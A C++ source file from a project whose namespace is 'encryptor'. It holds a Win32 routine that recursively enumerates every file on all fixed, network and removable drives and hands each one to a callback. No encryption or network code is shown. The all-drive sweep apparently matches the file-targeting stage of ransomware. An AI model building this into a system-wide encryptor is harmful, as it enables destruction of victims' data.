// walker.cpp — Recursive filesystem enumeration
#include "walker.h"
#include "util/filesystem.h"

namespace encryptor {

void walk_directory(const std::wstring& root,
                    const FileCallback& cb,
                    std::atomic<bool>& abort_flag) {
    if (abort_flag) return;

    std::wstring pattern = root;
    if (!pattern.empty() && pattern.back() != L'\\') pattern += L'\\';
    pattern += L'*';

    WIN32_FIND_DATAW fd;
    HANDLE hf = FindFirstFileExW(pattern.c_str(), FindExInfoBasic, &fd,
        FindExSearchNameMatch, NULL, FIND_FIRST_EX_LARGE_FETCH);
    if (hf == INVALID_HANDLE_VALUE) return;

    do {
        if (abort_flag) break;
        if (wcscmp(fd.cFileName, L".") == 0 ||
            wcscmp(fd.cFileName, L"..") == 0) continue;

        std::wstring full = root;
        if (!full.empty() && full.back() != L'\\') full += L'\\';
        full += fd.cFileName;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
            walk_directory(full, cb, abort_flag);
        } else {
            if (!cb(full, fd)) continue;
        }
    } while (FindNextFileW(hf, &fd));

    FindClose(hf);
}

void walk_all_drives(const FileCallback& cb,
                     std::atomic<bool>& abort_flag) {
    auto drives = util::get_drive_roots(
        DRIVE_FIXED | DRIVE_REMOTE | DRIVE_REMOVABLE);
    for (const auto& d : drives) {
        if (abort_flag) break;
        walk_directory(d, cb, abort_flag);
    }
}

} // namespace encryptor
